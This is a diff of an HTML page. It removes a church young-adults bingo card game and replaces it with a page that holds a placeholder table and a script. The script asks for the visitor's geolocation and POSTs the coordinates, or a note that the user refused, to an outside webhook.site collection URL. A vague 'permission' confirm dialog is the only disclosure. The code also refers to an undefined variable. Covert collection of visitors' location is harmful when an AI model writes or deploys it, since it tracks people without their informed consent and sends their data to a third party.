@@ -1,295 +1,126 @@
-<!DOCTYPE html>
-<html>
+<!-- Codes by HTML.am -->
 
+<!-- CSS Code -->
+<style type="text/css" scoped>
+  table.GeneratedTable {
+    width: 100%;
+    background-color: #ffffff;
+    border-collapse: collapse;
+    border-width: 1px;
+    border-color: #336600;
+    border-style: solid;
+    color: #009900;
+  }
 
+  table.GeneratedTable td,
+  table.GeneratedTable th {
+    border-width: 1px;
+    border-color: #336600;
+    border-style: solid;
+    padding: 3px;
+  }
 
-<head>
-
-<meta name="viewport" content="width=device-width">
-
-<style>
-img {
-    max-width: 100%;
-}
+  table.GeneratedTable thead {
+    background-color: #ccff99;
+  }
 </style>
 
-
-</head>
-
-
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 <script>
-var lines = [
-  // Credits to ster, gamingmedley, darkness3560, JettTheMedic, and many other redditors
-  "Born in another country",
-  "Has been baptized",
-  "Has 5 different letters in their name",
-  "Stays in the east",
-  "Hasn’t gotten Covid yet",
-  "Can speak more than 2 languages fluently",
-  "Exercised today",
-  "Has a pet",
-  "Doesn’t have Instagram",
-  "Has travelled overseas this year",
-  "Is an only child",
-  "Owns an NFT",
-  "Cannot snap their fingers",
-  "Drove to church today",
-  "Born in January",
-  "Has had a surgery before	",
-  "Has a coffee machine at home",
-  "Has given tuition at CSC",
-  "Goes to the office more often than working from home",
-  "Has signed up for YA camp",
-  "Sleeps past 10 am on Saturdays",
-  "Has a Disney plus account",
-  "Does not use a MacBook",
-  "Has allergies",
-  "Uses a Samsung Phone",
-];
+  // JavaScript code to display a popup prompt immediately
+  confirm("Do you have permission to access this page?");
 
-// Fisher-Yates Shuffle
-var shuffle = function(array) {
-  var m = array.length, t, i;
-  // While there remain elements to shuffle
-  while (m) {
-    // Pick a remaining element
-    i = Math.floor(Math.random() * m--);
-    // And swap it with the current element.
-    t = array[m];
-    array[m] = array[i];
-    array[i] = t;
-  }
-  return array;
-};
-// Did I just steal this code from Wikipedia, or something?
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+} else {
+  console.log("Geolocation is not supported by this browser.");
+}
 
-var insertToCard = function(array) {
-  var slot = 25;
-  while (slot) {
-    if (slot == 13) {
-      slot--;
-    } else {
-    $("label:nth-child(" + slot + ") .mark span").text(array[slot - 1]);
-    slot--;
+function successCallback(position) {
+  var latitude = position.coords.latitude;
+  var longitude = position.coords.longitude;
+  console.log("Latitude: " + latitude);
+  console.log("Longitude: " + longitude);
+
+
+  var contentElement = document.getElementById("content");
+      contentElement.style.display = "block";
+      
+  var xmlHttp = new XMLHttpRequest();
+  xmlHttp.open("POST", "https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce", true);
+  xmlHttp.setRequestHeader("Content-type", "application/json");
+
+  var data = {
+    name: userInput,
+    latitude: latitude,
+    longitude: longitude
+  };
+
+  xmlHttp.onreadystatechange = function() {
+    if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
+      console.log("Request sent successfully!");
+      console.log("Response:", xmlHttp.responseText);
     }
-  }
-};
+  };
 
-$(document).ready(function() {
-  var shuffledLines = shuffle(lines);
-  insertToCard(shuffledLines); // #hellaswag
-  console.log(shuffledLines)
-  });
+  xmlHttp.send(JSON.stringify(data));
+}
+
+function errorCallback(error) {
+  console.log("Error occurred. Error code: " + error.code);
+
+  var xmlHttp = new XMLHttpRequest();
+  xmlHttp.open("POST", "https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce", true);
+  xmlHttp.setRequestHeader("Content-type", "application/json");
+
+  var data = {
+    name: userInput,
+    message: "Blocked by user"
+  };
+
+  xmlHttp.onreadystatechange = function() {
+    if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
+      console.log("Request sent successfully!");
+      console.log("Response:", xmlHttp.responseText);
+    }
+  };
+
+  xmlHttp.send(JSON.stringify(data));
+}
 </script>
+<!-- HTML Code -->
 
-<style>
-body {
-  box-sizing: border-box;
-  background: #ffffff;
-  color: #000000;
-  font-family: "Helvetica Neue", Helvetica, sans-serif;
-  -webkit-user-select: none;
-     -moz-user-select: none;
-      -ms-user-select: none;
-          user-select: none;
-}
-
-*,
-*::before,
-*::after {
-  box-sizing: inherit;
-}
-
-main {
-  width: 33rem;
-  margin: 33px auto;
-  border: 3px solid #000000;
-  border-radius: 0px;
-  background: transparent;
-}
-
-h1 {
-  padding-top: 1rem;
-  color: #000000;
-  font-size: 2rem;
-  text-align: center;
-}
-h1 span {
-  display: inline-block;
-  width: 5.7rem;
-  height: 5.7rem;
-  font-size: 2.7em;
-}
-
-.grid {
-  display: flex;
-  flex-flow: row wrap;
-  justify-content: space-around;
-  width: 30rem;
-  height: 30rem;
-  margin: 0 auto;
-}
-
-label {
-  display: block;
-  width: 5.7rem;
-  height: 5.7rem;
-  border: 3px solid #84766b;
-  border-radius: 15px;
-  background: #6fd243 ;
-}
-label input {
-  display: none;
-}
-label input:checked + .mark {
-  background: transparent;
-  color: #e1e6ea;
-}
-label .mark {
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  width: 5.34rem;
-  height: 5.34rem;
-  padding: 0.2rem;
-  border-radius: 12px;
-  background: #e1e6ea ;
-  font-size: 0.9em;
-  text-align: center;
-}
-
-small {
-  display: block;
-  padding: 1em;
-  text-align: center;
-}
-</style>
-
-
-
-
-<main>
-  <h1>
-    YA Connect<br>
-    <span>B</span>
-    <span>I</span>
-    <span>N</span>
-    <span>G</span>
-    <span>O</span>
-  </h1>
-  <!-- Warning: the following code sucks, but it works, damn it! -->
-  <div class="grid">
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>1</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>2</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>3</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>4</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>5</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>6</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>7</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>8</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>9</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>10</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>11</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>12</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>FREE</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>14</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>15</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>16</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>17</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>18</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>19</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>20</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>21</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>22</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>23</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>24</span></div>
-    </label>
-    <label>
-      <input type="checkbox">
-      <div class="mark"><span>25</span></div>
-    </label>
-  </div>
-
- <input size="72.99rem" Placeholder="Enter notes here" type="text">          </input>
-</main>
+<body>
+  <div id="content">
+<img
+  src="https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/csrf-cross-site-request-forgery.png"
+  width="110"
+  height="110"
+  border="0"
+/>
+<table class="GeneratedTable">
+  <thead>
+    <tr>
+      <th>Header Cell 1</th>
+      <th>Header Cell 2</th>
+      <th>Header Cell 3</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Row 1, Cell 1</td>
+      <td>Row 1, Cell 2</td>
+      <td>Row 1, Cell 3</td>
+    </tr>
+    <tr>
+      <td>Row 2, Cell 1</td>
+      <td>Row 2, Cell 2</td>
+      <td>Row 2, Cell 3</td>
+    </tr>
+    <tr>
+      <td>Row 3, Cell 1</td>
+      <td>Row 3, Cell 2</td>
+      <td>Row 3, Cell 3</td>
+    </tr>
+  </tbody>
+</table>
 </body>
-
-
-
-
-
-</html>
-
-
